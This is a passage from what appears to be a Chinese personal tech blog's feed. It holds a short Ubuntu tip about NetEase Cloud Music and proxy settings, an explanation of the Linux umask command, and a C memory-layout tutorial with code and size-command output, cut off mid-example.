        <content type="html"><![CDATA[<p>最近老是遇到网易云音乐没网，但是浏览器却可以上网的问题。</p><p>最后发现是因为使用了代理的原因，系统的网络代理被更改了，所以将代理取消掉就好了。如图：</p><a id="more"></a><p><img data-src="https://ae01.alicdn.com/kf/Hf121c0bc2a4c406999f78188f2c060e4r.jpg"></p><p>顺便一提，网易云音乐1.0版本下载地址（新版本有点击图标无法开启的bug）：<span class="exturl" data-url="aHR0cDovL3MxLm11c2ljLjEyNi5uZXQvZG93bmxvYWQvcGMvbmV0ZWFzZS1jbG91ZC1tdXNpY18xLjAuMF9hbWQ2NF91YnVudHUxNi4wNC5kZWI=" title="http://s1.music.126.net/download/pc/netease-cloud-music_1.0.0_amd64_ubuntu16.04.deb">http://s1.music.126.net/download/pc/netease-cloud-music_1.0.0_amd64_ubuntu16.04.deb<i class="fa fa-external-link"></i></span></p>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>umask命令详解</title>
      <link href="/archives/6802486f.html"/>
      <url>/archives/6802486f.html</url>
      
        <content type="html"><![CDATA[<p>umask命令详解</p><p>也许你会和我一样，以为会使用chmod，chown这类命令就掌握了linux文件权限篇的基础知识。但是其实还有一个很重要的命令，命令虽小但是影响深远。它就是umask。</p><p>umask是控制文件权限中的一个重要命令或者说是一个重要的配置选项。前者可通过在shell中设置，而后者则需要在配置文件（**/etc/profile<strong>或</strong>/etc/bashrc**）中设置。在正式说明umask的相关知识前，需要讲解一个通识：</p><a id="more"></a><p>i&gt; linux在创建目录时，给的默认权限是777（rwx rwx rwx)；在创建文件时，给的默认权限是666(rw- rw- rw-)</p><h2 id="1-umask讲解及其计算公式"><a href="#1-umask讲解及其计算公式" class="headerlink" title="1. umask讲解及其计算公式"></a>1. umask讲解及其计算公式</h2><p>当用户创建文件（目录也是文件）时，umask用于辅助用户决定文件的默认权限。它由四个8进制位构成。我们可以在终端中执行<code>umask</code>来获取:</p><p><img data-src="https://ae01.alicdn.com/kf/H3010ba329c114b349480035a5e318426F.png"></p><p>i&gt; 说好的四个8进制位呢？你切换成root用户再执行umask命令就可以得到四个8进制位了，因为首位是特殊位，通常都是0，我们不用关心。如果你想了解首位的功能，可参考–<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82MTMwNjYzNg==" title="https://zhuanlan.zhihu.com/p/61306636">Linux 下一些特殊权限<i class="fa fa-external-link"></i></span></p><p>常见的umask值为002或者022，下面我们来解释它们各自的功能。</p><p>你可以把<strong>umask的值理解为系统需要屏蔽的权限：</strong></p><ol><li>在002中，也就是000 000 010，即需要屏蔽掉others的w权限。再结合前文我所提到的同时，创建目录默认为777，那么去掉others的w后，就是775，即111 111 101(rwx rwx r-x)。创建普通文件为666，那么去掉others的w后，就是664，即110 110 100(rw- rw- r–)。</li><li>同理在022中，也就是000 010 010，需要屏蔽掉group和others的w权限。那么创建目录，最终得到的755。创建文件，得到的是644。</li></ol><p>值得一提的是，不要理解最终权限是默认权限 <strong>减去</strong> umask的值。真正的<strong>计算公式</strong>是： </p><p>$$<br>{<br>final permission = mode \&amp; \sim umask<br>}<br>$$</p><h2 id="2-其它"><a href="#2-其它" class="headerlink" title="2. 其它"></a>2. 其它</h2><h3 id="2-1-umask命令"><a href="#2-1-umask命令" class="headerlink" title="2.1 umask命令"></a>2.1 umask命令</h3><p>在shell中，执行<code>umask value</code>即可。如umask 022，就把umask值设置为022了。</p><p>执行<code>umask -S</code>可以符号的形式打印当前掩码的反码，也就是<strong>默认允许的权限</strong>。</p><h3 id="2-2-umask的限制"><a href="#2-2-umask的限制" class="headerlink" title="2.2 umask的限制"></a>2.2 umask的限制</h3><p>umask不能授予已创建的文件或目录权限，如有需要，请使用chmod命令。</p><h3 id="2-3-umask安全等级"><a href="#2-3-umask安全等级" class="headerlink" title="2.3 umask安全等级"></a>2.3 umask安全等级</h3><table><thead><tr><th><strong>umask value</strong></th><th><strong>Security level</strong></th><th><strong>Effective permission (directory)</strong></th></tr></thead><tbody><tr><td>022</td><td>Permissive</td><td>755</td></tr><tr><td>026</td><td>Moderate</td><td>751</td></tr><tr><td>027</td><td>Moderate</td><td>750</td></tr><tr><td>077</td><td>Severe</td><td>700</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> umask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言内存分布详解</title>
      <link href="/archives/2567fa35.html"/>
      <url>/archives/2567fa35.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>老早就接触到了C语言中的内存布局，如代码段，数据段等等名词，也曾因为不了解C语言的内存分布机制而吃过亏。所以这里总结以下。现在让我们以两个问题来引入，先看下面这两段代码：</p><a id="more"></a><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// code 1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *str = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,str);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// code 2</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,str);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面两段代码，除了一个是字符指针，一个是字符数组以外，没什么不同。但是，你觉得上面两份代码的执行结果是什么呢？（假定的输入都是”world”)。</p><p>i&gt; code 1 将会报段错误，code 2才能正确执行。</p><p>好，这是第一个问题。再来看第二个问题。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *str1 = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> *str2 = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> str3[] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> str4[] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,str1 == str2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,str3 == str4);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//printf(&quot;0x%x\n&quot;,str1);</span></span><br><span class="line">    <span class="comment">//printf(&quot;0x%x\n&quot;,str2);</span></span><br><span class="line">    <span class="comment">//printf(&quot;0x%x\n&quot;,str3);</span></span><br><span class="line">    <span class="comment">//printf(&quot;0x%x\n&quot;,str4);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那这个程序，你觉得输出是怎样的呢?</p><p>先给答案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>i&gt; 也就是说str1和str2指向的地址是完全相同的。而str3的首地址和str4的首地址是不同的。</p><p>恩，现在带着这个问题，我们来谈谈C语言中的内存分布情况。</p><h2 id="2-C语言内存分布"><a href="#2-C语言内存分布" class="headerlink" title="2. C语言内存分布"></a>2. C语言内存分布</h2><p>典型的C语言程序由以下几个sections组成：</p><ul><li>文本段</li><li>数据段<ul><li>已初始化数据段</li><li>未初始化数据段（这样命名略微有点出入，稍后会对它进行解释）</li></ul></li><li>堆</li><li>栈</li></ul><p>具体分布可见下图：</p><p><img data-src="https://ae01.alicdn.com/kf/Ha6fdbf70cbe14d68b95f49111655d7a44.jpg"></p><h3 id="2-1-文本段"><a href="#2-1-文本段" class="headerlink" title="2.1 文本段"></a>2.1 文本段</h3><p>文本段，又称为代码段。代码段中存放可执行的指令，在内存中，为了保证不会因为堆栈溢出被覆盖，将其放在了堆栈段下面（从上图可以看出）。通常来讲代码段是共享的，这样多次反复执行的指令只需要在内存中驻留一个副本即可，比如C编译器，文本编辑器等。代码段一般是只读的，程序执行时不能随意更改指令，也是为了进行隔离保护。</p><h3 id="2-2-数据段"><a href="#2-2-数据段" class="headerlink" title="2.2 数据段"></a>2.2 数据段</h3><p>数据段是用来存储“全局变量和静态变量”的。根据是否被初始化为0（手动或由编译器自动）又分为了“初始化数据段”和“未初始化数据段”。</p><h4 id="2-2-1-未初始化数据段"><a href="#2-2-1-未初始化数据段" class="headerlink" title="2.2.1 未初始化数据段"></a>2.2.1 未初始化数据段</h4><p>未初始化数据段，又名bss(block started by symbol)，指的是在程序中未被手工初始化或者被初始化为0的全局变量或静态变量。如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a;</span><br><span class="line"><span class="keyword">int</span> b = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> global_a;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> glboal_b = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> main_a;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> main_b =<span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这些变量均会被存储在“未初始化数据段”（观察到有些变量我们手工赋值为了0，所以我说这样的命名并不太准确）。对于未手工初始化的变量，编译器也会自动帮助我们初始化。</p><h4 id="2-2-2-初始化数据段"><a href="#2-2-2-初始化数据段" class="headerlink" title="2.2.2 初始化数据段"></a>2.2.2 初始化数据段</h4><p>初始化数据段值的是在程序中被手工初始化为非0的全局变量或静态变量。如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">static</span> global_a = <span class="number">20</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> main_a = <span class="number">30</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但初始化数据段又可分为可读写数据段和只读数据段。</p><p>举个栗子，对于字符串常量来说，它们存储在只读数据段中，且在<strong>整个内存中只保留一份副本</strong>。如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *str1 = <span class="string">&quot;hello&quot;</span>;</span><br></pre></td></tr></table></figure><p>这的”hello”就是存在只读数据段中。</p><p>而对于全局字符串来说，他们是存储在可读写数据段中，注意，我说的是全局字符串。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> str2[] = <span class="string">&quot;hello&quot;</span>;<span class="comment">// str2[] 定义为全局变量</span></span><br></pre></td></tr></table></figure><h3 id="3-堆区"><a href="#3-堆区" class="headerlink" title="3. 堆区"></a>3. 堆区</h3><p>堆区是动态内存分配的地方，在这里的内存需要程序员自己分配与释放。</p><p>一般来说，堆区紧跟BSS区末端，然后从低地址往高地址增长。堆中内存分配管理由malloc，remalloc和free标准库函数来完成。堆可以被进程的所有共享库以及动态加载模块共享。</p><h3 id="4-栈区"><a href="#4-栈区" class="headerlink" title="4. 栈区"></a>4. 栈区</h3><p>栈区中存放着我们常见的变量，这些变量由操作系统自动管理释放。</p><p>栈区一般与堆区相邻，但它是由上往下生长（即从高地址向低地址生长，和堆区相反），当栈区指针和堆区指针相遇时，说明堆栈已耗尽（现代大地址空间和虚拟内存技术可以将栈和堆放在任何地方，但是二者增长方向也是相反的）。栈指针寄存器记录栈顶地址，每次有值push进栈就会对栈指针进行修改。一个函数push进栈的一组值被称做堆栈帧，堆栈帧保存有该函数的最小的返回地址。</p><p>写个简单的程序，来大体验证各个区在内存中的位置：</p><p>当然了，文本区就没办法验证了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> init_a = <span class="number">1</span>;  <span class="comment">// 初始化</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> uninit_a; <span class="comment">// 未初始化</span></span><br><span class="line">    <span class="keyword">int</span> stack_a;        <span class="comment">// 栈区</span></span><br><span class="line">    <span class="keyword">int</span> *heap_a = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>));   <span class="comment">// 堆区</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;init_a 0x%x\n&quot;</span>,&amp;init_a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;uninit_a 0x%x\n&quot;</span>,&amp;uninit_a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stack_a 0x%x\n&quot;</span>,&amp;stack_a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;heap_a point to 0x%x\n&quot;</span>,heap_a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;heap_a itself 0x%x\n&quot;</span>,&amp;heap_a);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(heap_a)</span><br><span class="line">       <span class="built_in">free</span>(heap_a);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码中，我分别定义了数据段，栈区和堆区变量，之后分别打印了它们的地址。结果如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">init_a 0x601050</span><br><span class="line">uninit_a 0x601058</span><br><span class="line">stack_a 0x389ebd4c</span><br><span class="line">heap_a point to 0x672010</span><br><span class="line">heap_a itself 0x389ebd50</span><br></pre></td></tr></table></figure><p>可以看到init_a和uninit_a都在内存的相对较低的位置，stack_a在相对很高的位置。heap_a所指向的位置也就是堆区的位置依旧不高，而heap_a这个指针本身是属于栈区，所以它的地址较高，且紧跟stack_a变量。stack_a和heap_a指针本身的地址刚好差了4个字节，这也是一个int所占的字节数。</p><h2 id="3-使用size指令来验证"><a href="#3-使用size指令来验证" class="headerlink" title="3. 使用size指令来验证"></a>3. 使用size指令来验证</h2><p>我们可以使用size指令来看未初始化数据段和初始化数据段中所占的字节数。</p><p>先看这样一段代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> global; <span class="comment">/* Uninitialized variable stored in bss*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>将这段代码编译，并在命令窗口执行下面这样的命令:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc memory-layout.c -o memory-layout</span><br><span class="line">size memory-layout</span><br></pre></td></tr></table></figure><p>可以得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">text       data        bss        dec        hex    filename</span><br><span class="line"> 960        248         12       1220        4c4    memory-layout</span><br></pre></td></tr></table></figure><p>现在我们对源代码进行简单修改：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> global; <span class="comment">/* Uninitialized variable stored in bss*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> i; <span class="comment">/* Uninitialized static variable stored in bss */</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>重新编译并执行size命令后可得：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">text       data        bss        dec        hex    filename</span><br><span class="line"> <span class="number">960</span>        <span class="number">248</span>         <span class="number">16</span>       <span class="number">1224</span>        <span class="number">4</span>c8    memory-layout</span><br></pre></td></tr></table></figure><p>是不是看到bss区的数据多了4个字节？这是因为我们多定义了一个static变量。</p><p>再来修改：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> global; <span class="comment">/* Uninitialized variable stored in bss*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> i = <span class="number">100</span>; <span class="comment">/* Initialized static variable stored in DS*/</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">text       data        bss        dec        hex    filename</span><br><span class="line"><span class="number">960</span>         <span class="number">252</span>         <span class="number">12</span>       <span class="number">1224</span>        <span class="number">4</span>c8    memory-layout</span><br></pre></td></tr></table></figure><p>这次是data区（初始化数据段）多了4个字节。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> global = <span class="number">10</span>; <span class="comment">/* initialized global variable stored in DS*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> i = <span class="number">100</span>; <span class="comment">/* Initialized static variable stored in DS*/</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">text       data        bss        dec        hex    filename</span><br><span class="line">960         256          8       1224        4c8    memory-layout</span><br></pre></td></tr></table></figure><h2 id="4-问题解答"><a href="#4-问题解答" class="headerlink" title="4. 问题解答"></a>4. 问题解答</h2><p>好勒，现在我们介绍介绍完c语言内存分布的基础概念，已经可以解决在文初所提出的问题了。</p><h3 id="4-1-问题1"><a href="#4-1-问题1" class="headerlink" title="4.1 问题1"></a>4.1 问题1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// code 1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *str = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,str);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// code 2</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,str);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里为什么code 1会报段错误呢？</p><p>因为“hello”是存放在初始化数据段中，且字符串常量是只读数据段。我们尝试通过scanf对”hello”所在的地址的数据进行修改是不合法的。</p><p>而在code 2中，char str[] = “hello”; 这里的”hello“是作为副本存储在str[]中的，而str[] 是存放在栈区的，栈区的内容当然就可以更改咯。</p><p>我们再通过下面这份代码来验证：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *str1 = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> str2[] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;str1 point to 0x%x\nhello itself 0x%x\n&quot;</span>,str1,&amp;(<span class="string">&quot;hello&quot;</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;str1 itself 0x%x\n&quot;</span>,&amp;str1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;str2  0x%x\n&quot;</span>,str2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">str1 point to <span class="number">0x4006b8</span></span><br><span class="line">hello itself <span class="number">0x4006b8</span></span><br><span class="line">str1 itself <span class="number">0x1aae2bf8</span></span><br><span class="line">str2  <span class="number">0x1aae2c00</span></span><br></pre></td></tr></table></figure><p>明显看到”hello”在低内存地址的地方，也从一定程度上说明了”hello”是存放在数据段的。</p><p>而str1和str2本身都属于栈区。也就不难理解为什么str2的内容可以更改了。</p><h3 id="4-2-问题2"><a href="#4-2-问题2" class="headerlink" title="4.2 问题2"></a>4.2 问题2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *str1 = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> *str2 = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> str3[] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> str4[] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,str1 == str2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,str3 == str4);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%x\n&quot;</span>,str1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%x\n&quot;</span>,str2);</span><br><span class="line">    <span 